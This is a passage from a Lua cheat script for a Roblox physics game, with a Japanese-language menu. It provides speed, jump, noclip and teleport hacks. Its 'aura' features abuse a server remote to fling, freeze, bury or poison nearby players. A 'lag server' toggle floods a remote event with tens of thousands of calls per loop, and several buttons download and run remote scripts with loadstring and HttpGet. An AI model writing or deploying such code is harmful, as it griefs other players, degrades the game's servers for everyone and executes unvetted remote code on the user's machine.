radio           end
            end)
        else
            if CurrentConnection then
                CurrentConnection:Disconnect()
                CurrentConnection = nil
            end
            print("アンチ掴み無効化")
        end
    end
})

antiTab:AddToggle({
    Name = "アンチ爆発",
    Default = false,
    Color = Color3.fromRGB(255, 165, 0),
    Flag = "AntiExplosion",
    Callback = function(enabled)
        if enabled then
            if localPlayer.Character then
                local humanoid = localPlayer.Character:WaitForChild("Humanoid", 5)
                if humanoid then
                    local ragdolled = humanoid:FindFirstChild("Ragdolled")
                    if ragdolled then
                        antiExplosionConnection = ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
                            for _, part in ipairs(localPlayer.Character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.Anchored = ragdolled.Value
                                end
                            end
                        end)
                    end
                end
            end

            characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
                if antiExplosionConnection then
                    antiExplosionConnection:Disconnect()
                end

                local humanoid = character:WaitForChild("Humanoid", 5)
                if humanoid then
                    local ragdolled = humanoid:FindFirstChild("Ragdolled")
                    if ragdolled then
                        antiExplosionConnection = ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
                            for _, part in ipairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.Anchored = ragdolled.Value
                                end
                            end
                        end)
                    end
                end
            end)
        else
            if antiExplosionConnection then
                antiExplosionConnection:Disconnect()
                antiExplosionConnection = nil
            end
            if characterAddedConn then
                characterAddedConn:Disconnect()
                characterAddedConn = nil
            end
        end
    end
})

local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
localPlayer.CharacterAdded:Connect(function(character)
    playerCharacter = character
end)
local currentKunai = nil
local kunaiSpawningEnabled = false
local function spawnItemCf(itemName, cframe)
    local rotation = Vector3.new(90, 0, 0)
    local toy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    return toy
end
local function attachKunaiToThigh()
    if currentKunai and currentKunai.Parent then 
        print("Kunai already exists. Skipping spawn.")
        return 
    end
    local torso = playerCharacter:WaitForChild("Torso", 5)
    if torso then
        local kunaiPosition = torso.CFrame
            * CFrame.new(-0.5, -torso.Size.Y / 2, 0)
            * CFrame.Angles(math.rad(-100), 0, 0)
        spawnItemCf("NinjaKunai", kunaiPosition)
        for i = 1, 20 do
            local toysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if toysFolder then
                currentKunai = toysFolder:FindFirstChild("NinjaKunai")
                if currentKunai then
                    break
                end
            end
            task.wait()
        end
        if currentKunai then
            currentKunai.AncestryChanged:Connect(function(_, parent)
                if not parent then
                    print("Kunai has been removed. Respawning...")
                    currentKunai = nil
                    attachKunaiToThigh()
                end
            end)
            print("Kunai has been spawned near the thigh.")
        else
            warn("Kunai could not be spawned. Retrying...")
        end
    else
        warn("Torso not found!")
    end
end
local function monitorKunai()
    while kunaiSpawningEnabled do
        if not (currentKunai and currentKunai.Parent) then
            print("Kunai missing, respawning...")
            currentKunai = nil
            attachKunaiToThigh()
        end
        task.wait()
    end
end
antiTab:AddToggle({
    Name = "アンチキック",
    Default = false,
    Callback = function(value)
        kunaiSpawningEnabled = value
        if value then
            attachKunaiToThigh()
            task.spawn(monitorKunai)
        else
            kunaiSpawningEnabled = false
            print("Kunai monitoring stopped.")
        end
    end
})

local ToggleActive = false
local playerTab = Window:MakeTab({
    	Name = "プレイヤー",
    	Icon = "",
    	PremiumOnly = false
})

local HackedWalkSpeed = 16
playerTab:AddToggle({
    Name = "プレイヤー速度",
    Default = false,
    Callback = function(state)
        ToggleActive = state
    end
})

playerTab:AddSlider({
    Name = "速度",
    Min = 16,
    Max = 1000,
    Default = 16,
    Color = Color3.fromRGB(150, 122, 240),
    Increment = 1,
    ValueName = "速さ",
    Callback = function(speed)
        HackedWalkSpeed = speed
    end
})

local function setWalkSpeed(Humanoid)
        if ToggleActive and Humanoid then
            Humanoid.WalkSpeed = HackedWalkSpeed
        else
            Humanoid.WalkSpeed = 16
        end
    end

    local function preventSliding(Character, Humanoid)
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        if RootPart then
            if Humanoid.MoveDirection.Magnitude == 0 then
                RootPart.AssemblyLinearVelocity = Vector3.new(0, RootPart.AssemblyLinearVelocity.Y, 0)
            else
                local moveDir = Humanoid.MoveDirection * HackedWalkSpeed
                RootPart.AssemblyLinearVelocity = Vector3.new(moveDir.X, RootPart.AssemblyLinearVelocity.Y, moveDir.Z)
            end
        end
    end

local function updateCharacter(Char)
        local Humanoid = Char:WaitForChild("Humanoid")
        local RootPart = Char:WaitForChild("HumanoidRootPart")

        setWalkSpeed(Humanoid)

        Humanoid.Changed:Connect(function()
            if Humanoid.Health > 0 then
                setWalkSpeed(Humanoid)
            end
        end)

        RunService.RenderStepped:Connect(function()
            if ToggleActive then
                setWalkSpeed(Humanoid)
                preventSliding(Char, Humanoid)
            end
        end)
    end

    local MyPlr = Players.LocalPlayer
    if MyPlr.Character then
        updateCharacter(MyPlr.Character)
    end
    MyPlr.CharacterAdded:Connect(updateCharacter)


local Toggle =  playerTab:AddToggle({
    Name = "プレイヤーのジャンプ力",
    Default = false,
    Callback = function(state)
        ToggleActive = state
    end
})

playerTab:AddSlider({
    Name = "ジャンプ力",
    Min = 24,
    Max = 500,
    Default = 24,
    Color = Color3.fromRGB(150,122,240),
    Increment = 1,
    ValueName = "高さ",
    Callback = function(jumpPower)
        HackedJumpPower = jumpPower

        local Plrs = game:GetService("Players")
        local MyPlr = Plrs.LocalPlayer
        
        local function setJumpPower(Humanoid)
            if ToggleActive then 
                Humanoid.JumpPower = HackedJumpPower
            end
        end

        local function updateCharacter(Char)
            local Humanoid = Char:WaitForChild("Humanoid")
            setJumpPower(Humanoid)

            while true do
                wait(0) 
                if not ToggleActive then break end  
                setJumpPower(Humanoid) 
            end

            Humanoid.Changed:connect(function()
                setJumpPower(Humanoid)
            end)
        end

        if MyPlr.Character then
            updateCharacter(MyPlr.Character)
        end
        
        MyPlr.CharacterAdded:connect(updateCharacter)
    end
})

local InfiniteJumpEnabled = false
playerTab:AddToggle({
        Name = "無限ジャンプ",
        Default = false,
        Callback = function(Value)
            InfiniteJumpEnabled = Value
        end
})
game:GetService("UserInputService").JumpRequest:Connect(function()
        if InfiniteJumpEnabled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
     end
end)

local Plr = Players.LocalPlayer
local Clipon = false
local SteppedConnection
playerTab:AddToggle({
    Name = "ノークリップ",
    Default = false,
    Callback = function(value)
        Clipon = value
        if Clipon then
            SteppedConnection = RunService.Stepped:Connect(function()
                for _, obj in pairs(Workspace:GetChildren()) do
                    if obj.Name == Plr.Name then
                        for _, part in pairs(obj:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end)
        else
            if SteppedConnection then
                SteppedConnection:Disconnect()
                SteppedConnection = nil
            end
        end
    end
})

playerTab:AddButton({
    Name = "3人称",
    Callback = function()
local player = game.Players.LocalPlayer
if player then
                player.CameraMaxZoomDistance = 999999999
                player.CameraMinZoomDistance = 0.5 
                player.CameraMode = Enum.CameraMode.Classic
                print("3人称視点を有効化しました。")
            else
                warn("プレイヤーが見つかりません。")
         end
     end
})

local animationEnabled = false
local animation

local Section = playerTab:AddSection({
    Name = "アニメーション"
})

playerTab:AddToggle({
    Name = "燃えるアニメーション",
    Default = false,
    Callback = function(value)
        animationEnabled = value
        if animationEnabled then
            if not animation then
                animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://11227676639"
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        local animationTrack = animator:LoadAnimation(animation)
                        animationTrack:Play()
                    end
                end
            end
        else
            if animation then
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                            track:Stop()
                        end
                    end
                end
                animation = nil
            end
        end
    end
})


playerTab:AddToggle({
    Name = "燃えるアニメーション2",
    Default = false,
    Callback = function(value)
        animationEnabled = value
        if animationEnabled then
            if not animation then
                animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://7382979822"
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        local animationTrack = animator:LoadAnimation(animation)
                        animationTrack:Play()
                    end
                end
            end
        else
            if animation then
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                            track:Stop()
                        end
                    end
                end
                animation = nil
            end
        end
    end
})
local config = {
    ToyToLoad = "BallSnowball",
    MaxBallSnowball = 1,
    AutoBallSnowballEnabled = false,
    TargetPlayerName = ""
}
localPlayer.CharacterAdded:Connect(function(character)
    playerCharacter = character
end)

local toysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

local function spawnItemCf(itemName, cframe)
    task.spawn(function()
        local rotation = Vector3.new(0, 0, 0)
        local success, err = pcall(function()
            game:GetService("ReplicatedStorage").MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
        end)
        if success then
            print("[INFO] アイテム " .. itemName .. " のスポーンリクエスト成功")
        else
            warn("[ERROR] アイテム " .. itemName .. " のスポーンリクエスト失敗: " .. tostring(err))
        end
    end)
end

local function findOwnedBallSnowball()
    if not toysFolder then
        toysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
    end

    if toysFolder then
        for _, v in pairs(toysFolder:GetChildren()) do
            if v.Name == "BallSnowball" then
                return v
            end
        end
    end

    return nil
end

local function teleportItemToPlayer(item, targetPlayer)
    if item and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local targetCFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        item:SetPrimaryPartCFrame(targetCFrame)
        print("[INFO] " .. item.Name .. " を " .. targetPlayer.DisplayName .. " にテレポートしました")
    else
        print("[WARN] ターゲットプレイヤーまたはアイテムが無効です")
    end
end

local function autoBallSnowball()
    local checkInterval = 0
    while config.AutoBallSnowballEnabled do
        pcall(function()
            local ballSnowball = findOwnedBallSnowball()

            if not ballSnowball then
                if localPlayer.CanSpawnToy and localPlayer.CanSpawnToy.Value and playerCharacter:FindFirstChild("Head") then
                    print("[INFO] BallSnowballをスポーン中...")
                    spawnItemCf(config.ToyToLoad, playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
                end
            else
                local targetPlayer = game.Players:FindFirstChild(config.TargetPlayerName)
                if targetPlayer then
                    teleportItemToPlayer(ballSnowball, targetPlayer)
                end
            end
        end)
        wait(checkInterval)
    end
end

local function toggleAutoBallSnowball(enabled)
    config.AutoBallSnowballEnabled = enabled
    if enabled then
        print("[INFO] 自動BallSnowball機能を有効化しました")
        task.spawn(autoBallSnowball)
    else
        print("[INFO] 自動BallSnowball機能を無効化しました")
    end
end

local function getPlayerList()
    local playerList = {}
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(playerList, player.Name .. " (" .. player.DisplayName .. ")")
    end
    return playerList
end

local function updateTargetPlayer(selected)
    for _, player in pairs(game.Players:GetPlayers()) do
        if selected == player.Name .. " (" .. player.DisplayName .. ")" then
            config.TargetPlayerName = player.Name
            print("[INFO] ターゲットプレイヤーが " .. player.DisplayName .. " に設定されました")
            break
        end
    end
end

local MainTab = Window:MakeTab({
    Name = "爆発系",
    Icon = "",
    PremiumOnly = false
})

MainTab:AddDropdown({
    Name = "ターゲット",
    Default = "",
    Options = getPlayerList(),
    Callback = function(selected)
        updateTargetPlayer(selected)
    end,
    AllowCustom = false
})

task.spawn(function()
    while true do
        task.wait(3)
        local dropdown = MainTab:GetElement("ターゲットプレイヤー選択")
        dropdown:SetOptions(getPlayerList())
    end
end)

MainTab:AddToggle({
    Name = "自動無敵突破",
    Default = false,
    Callback = function(enabled)
        toggleAutoBallSnowball(enabled)
    end
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer
local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local Struggle = CharacterEvents:WaitForChild("Struggle")
local CreateLine = GrabEvents:WaitForChild("CreateGrabLine")
local DestroyLine = GrabEvents:WaitForChild("DestroyGrabLine")
local DestroyToy = MenuToys:WaitForChild("DestroyToy")
local plrrr = game:GetService("Players")
local Player = plrrr.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RS = game:GetService("ReplicatedStorage")
local CE = RS:WaitForChild("CharacterEvents")
local BeingHeld = Player:WaitForChild("IsHeld")
local PlayerScripts = Player:WaitForChild("PlayerScripts")
local bodyvel_Name = "FlingVelocity"
local userinputs = game:GetService("UserInputService")
local Players = game:GetService("Players")
local w = game:GetService("Workspace")
local r = game:GetService("RunService")
local d = game:GetService("Debris")
local enabled = true
local auraRadius = 25
local function getDescendantParts(descendantName)
local parts = {}
    for _, descendant in ipairs(workspace.Map:GetDescendants()) do
        if descendant:IsA("Part") and descendant.Name == descendantName then
            table.insert(parts, descendant)
        end
    end
    return parts
end

local AuraTab = Window:MakeTab({
    Name = "オーラ",
    PremiumOnly = false
})

AuraTab:AddSlider({
    Name = "半径",
    Min = 0,
    Max = 25,
    Color = Color3.fromRGB(0, 220, 0),
    ValueName = ".",
    Increment = 1,
    Default = auraRadius,
    Callback = function(value)
        auraRadius = value
    end
})

AuraTab:AddToggle({
    Name = "掴むオーラ",
    Color = Color3.fromRGB(0, 255, 0),
    Default = false,
    Flag = "FlingAura",
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                            local head = character.Head
                            local humanoidRootPart = character.HumanoidRootPart
                            for _, player in pairs(Players:GetPlayers()) do
                                coroutine.wrap(function()
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Torso")
                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                task.wait(0.1)
                                               
                                            end
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Air Suspend Aura: " .. tostring(err))
                    end
                    wait(0)
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then
                coroutine.close(auraCoroutine)
                auraCoroutine = nil
            end
        end
    end
})

AuraTab:AddSlider({
    Name = "掴む速度",
    Min = 0,
    Max = 5,
    Color = Color3.fromRGB(0, 0, 220),
    ValueName = ".",
    Increment = 1,
    Default = 0,
    Callback = function(value)
    end
})

AuraTab:AddToggle({
    Name = "上昇オーラ",
    Color = Color3.fromRGB(0, 255, 0),
    Default = false,
    Flag = "skyAura",
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                            local head = character.Head
                            local humanoidRootPart = character.HumanoidRootPart
                            for _, player in pairs(Players:GetPlayers()) do
                                coroutine.wrap(function()
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Torso")
                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                task.wait(0.1)
                                                local velocity = playerTorso:FindFirstChild("l") or Instance.new("BodyVelocity", playerTorso)
                                                velocity.Name = "l"
                                                velocity.Velocity = Vector3.new(0, 30, 0)
                                                velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                                Debris:AddItem(velocity, 20)
                                            end
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Air Suspend Aura: " .. tostring(err))
                    end
                    wait(J_kkirai)
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then
                coroutine.close(auraCoroutine)
                auraCoroutine = nil
            end
        end
    end
})

P_a = 0
AuraTab:AddToggle({
    Name = "フリングオーラ",
    Color = Color3.fromRGB(0, 255, 0),
    Default = false,
    Flag = "FlingAura",
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                            local head = character.Head
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                coroutine.wrap(function()
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Torso")
                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                task.wait(0.1)
                                                local velocity = playerTorso:FindFirstChild("l") or Instance.new("BodyVelocity", playerTorso)
                                                velocity.Name = "l"
                                                velocity.Velocity = Vector3.new(50000000000, 5000000000000000, 50000000000)
                                                velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                                Debris:AddItem(velocity, 1000)
                                            end
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Air Suspend Aura: " .. tostring(err))
                    end
                    wait(P_a)
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then
                coroutine.close(auraCoroutine)
                auraCoroutine = nil
            end
        end
    end
})

R_a = 1
AuraTab:AddToggle({
    Name = "フリーズオーラ",
    Color = Color3.fromRGB(0, 255, 0),
    Default = false,
    Flag = "FreezeAurav2",
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                            local head = character.Head
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                coroutine.wrap(function()
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Torso")
                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                task.wait(0.1)
                                                local velocity = playerTorso:FindFirstChild("l") or Instance.new("BodyVelocity", playerTorso)
                                                velocity.Name = "l"
                                                velocity.Velocity = Vector3.new(0, 0, 0)
                                                velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                                Debris:AddItem(velocity, 1000000000000)
                                            end
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Air Suspend Aura: " .. tostring(err))
                    end
                    wait(R_a)
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then
                coroutine.close(auraCoroutine)
                auraCoroutine = nil
            end
        end
    end
})

P_ap = 1
AuraTab:AddToggle({
    Name = "埋まるオーラ",
    Default = false,
    Color = Color3.fromRGB(0, 255, 0),
    Flag = "narakuGrab",
    Callback = function(enabled)
        if enabled then
            gravityCoroutine = coroutine.create(function()
                while enabled do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("HumanoidRootPart") then
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local playerCharacter = player.Character
                                    local playerTorso = playerCharacter:FindFirstChild("Torso")
                                    if playerTorso then
                                        local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                        if distance <= auraRadius then
                                            SetNetworkOwner:FireServer(playerTorso, humanoidRootPart.FirePlayerPart.CFrame)
                                            task.wait(0.1)
                                            local force = playerTorso:FindFirstChild("GravityForce") or Instance.new("BodyForce")
                                            force.Parent = playerTorso
                                            force.Name = "GravityForce"
                                            for _, part in ipairs(playerCharacter:GetDescendants()) do
                                                if part:IsA("BasePart") then
                                                    part.CanCollide = false
                                                end
                                            end
                                            force.Force = Vector3.new(0, 1200, 0)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Hell send Aura: " .. tostring(err))
                    end
                    wait(P_ap)
                end
            end)
            coroutine.resume(gravityCoroutine)
        elseif gravityCoroutine then
            coroutine.close(gravityCoroutine)
            gravityCoroutine = nil
        end
    end
})

local poisonAuraCoroutine = nil
local poisonHurtParts = getDescendantParts("PoisonHurtPart")
AuraTab:AddToggle({
    Name = "毒オーラ",
    Default = false,
    Color = Color3.fromRGB(0, 255, 0),
    Callback = function(enabled)
        if enabled then
            poisonAuraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("HumanoidRootPart") then
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local playerCharacter = player.Character
                                    local playerTorso = playerCharacter:FindFirstChild("Torso")
                                    local playerHead = playerCharacter:FindFirstChild("Head")

                                    if playerTorso and playerHead then
                                        local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                        if distance <= auraRadius then

                                            SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.CFrame)

                                            for _, part in pairs(poisonHurtParts) do
                                                part.Size = Vector3.new(1, 3, 1)
                                                part.Transparency = 1
                                                part.Position = playerHead.Position
                                            end

                                            wait(0.1)

                                            for _, part in pairs(poisonHurtParts) do
                                                part.Position = Vector3.new(0, -200, 0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    if not success then
                        warn("Error in Poison Aura: " .. tostring(err))
                    end

                    wait(0.02)
                end
            end)
            coroutine.resume(poisonAuraCoroutine)
        elseif poisonAuraCoroutine then
            coroutine.close(poisonAuraCoroutine)
            for _, part in pairs(poisonHurtParts) do
                part.Position = Vector3.new(0, -200, 0)
            end
            poisonAuraCoroutine = nil
        end
    end
})

local LagTab = Window:MakeTab({
    Name = "ラグ",
    Icon = "",
    PremiumOnly = false,
})


local running = false

LagTab:AddToggle({
    Name = "クレイジーライン",
    Default = false,
    Callback = function(state)
        running = state
        if running then 
            coroutine.wrap(function()
                while running do
                    for i = 1, 5 do
                        local players = game:GetService("Players"):GetPlayers()
                        if #players > 0 then
                            local randomPlayer = players[math.random(2, #players)]
                            if randomPlayer.Character and randomPlayer.Character:FindFirstChild("Head") then
                                game:GetService("ReplicatedStorage").GrabEvents.CreateGrabLine:FireServer(
                                    randomPlayer.Character.Head,
                                    CFrame.new(0, 0, 0)
                                )
                            end
                        end
                    end
                    wait() 
                end
            end)() 
        end
    end
})


local running = false

LagTab:AddToggle({
    Name = "ラグサーバー",
    Default = false,
    Callback = function(state)
        running = state
        if running then
            coroutine.wrap(function()
                while running do
                    for i = 1, 30000 do
                        coroutine.wrap(function()
                            local part = workspace:FindFirstChildOfClass("Part")
                            if part then
                                game:GetService("ReplicatedStorage").GrabEvents.CreateGrabLine:FireServer(
                                    part,
                                    part.CFrame * CFrame.new(math.random(-1,1), 0, math.random(-1,1))
                                )
                            end
                        end)()
                    end
                    wait()
                end
            end)()
        else
            print("ライン生成が停止しました")
        end
    end
})
local TeleportTab = Window:MakeTab({
      Name = "テレポート",
      PremiumOnly = false
})

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local localPlayer = Players.LocalPlayer
local selectedPlayer = nil
local function getPlayerList()
local playerList = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(playerList, player.DisplayName .. " (@" .. 
player.Name .. ")")
        end
    end
    return playerList
end
local function teleportToPlayer(targetPlayer)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            print("テレポートしました:", targetPlayer.Name)
        else
            print("自分のHumanoidRootPartが見つかりません。")
        end
    else
        print("ターゲットのHumanoidRootPartが見つかりません。")
    end
end

TeleportTab:AddDropdown({
    Name = "プレイヤーを選ぶ",
    Default = "",
    Options = getPlayerList(),
    Callback = function(selected)
        for _, player in pairs(Players:GetPlayers()) do
            local displayNameWithUsername = player.DisplayName .. " (@" .. player.Name .. ")"
            if selected == displayNameWithUsername then
                selectedPlayer = player
                print("選択されたプレイヤー:", selectedPlayer.Name)
                return
            end
        end
        selectedPlayer = nil
        print("プレイヤーが見つかりません:", selected)
    end
})

TeleportTab:AddButton({
    Name = "テレポート",
    Callback = function()
        if not selectedPlayer then
            print("プレイヤーが選択されていません。")
            return
        end
        teleportToPlayer(selectedPlayer)
    end
})

local teleportPosition = Vector3.new(0, -7, 0)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "初期位置",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local teleportPosition = Vector3.new(-486, -7, -161)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "赤い家",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local teleportPosition = Vector3.new(505, 83, -342)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "青い家",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local teleportPosition = Vector3.new(-530, -7, 91)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "緑の家",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local teleportPosition = Vector3.new(551, 123, -76)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "黄色い家",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local teleportPosition = Vector3.new(253, -7, 459)
local Teleporting = false
local RunService = game:GetService("RunService")

TeleportTab:AddToggle({
    Name = "紫の家",
    Default = false,
    Callback = function(value)
        Teleporting = value
        if Teleporting then
            RunService.Heartbeat:Connect(function()
                if Teleporting then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
            end)
        end
    end
})

local scriptTab = Window:MakeTab({
    	Name = "オナリプト",
    	Icon = "",
    	PremiumOnly = false
})
    
scriptTab:AddButton({
    	Name = "IY",
    	Callback = function()
          		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end    
})
    
          		
    
scriptTab:AddButton({
    	Name = "👻",
    	Callback = function()
          		print("button pressed")loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    
  end
})
scriptTab:AddButton({
    	Name = "vfly",
    	Callback = function()
